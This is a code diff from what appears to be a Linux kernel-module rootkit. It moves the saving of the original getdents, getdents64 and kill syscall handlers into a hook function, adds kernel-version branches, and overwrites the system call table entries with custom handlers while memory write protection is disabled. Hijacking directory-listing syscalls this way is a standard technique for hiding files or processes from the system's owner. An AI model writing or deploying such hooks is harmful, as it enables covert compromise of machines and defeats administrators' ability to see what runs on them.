@@ -271,25 +271,26 @@ out:
 	return ret;
 }
 
-static int store(void)
-{
-    orig_getdents64 = (ptregs_t)__sys_call_table[__NR_getdents64];
-    orig_getdents = (ptregs_t)__sys_call_table[__NR_getdents];
-    return 0;
-}
-
 static int hook(void)
 {
-    __sys_call_table[__NR_getdents64] = (unsigned long)&c_getdents64;
-    __sys_call_table[__NR_getdents] = (unsigned long)&c_getdents;
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
+	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
+	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
+#else
+	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
+	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
+#endif
+	__sys_call_table[__NR_getdents] = (unsigned long) c_getdents;
+	__sys_call_table[__NR_getdents64] = (unsigned long) c_getdents64;
 
-    return 0;
+	return 0;
 }
 
 static int cleanup(void)
 {
-    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
-    __sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
+    __sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
+	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
 
     return 0;
 }
@@ -345,7 +346,6 @@ static void unprotect_memory(void)
 static int __init mod_init(void)
 {
     __sys_call_table = get_syscall_table();
-    store();
     unprotect_memory();
     hook();
     protect_memory();
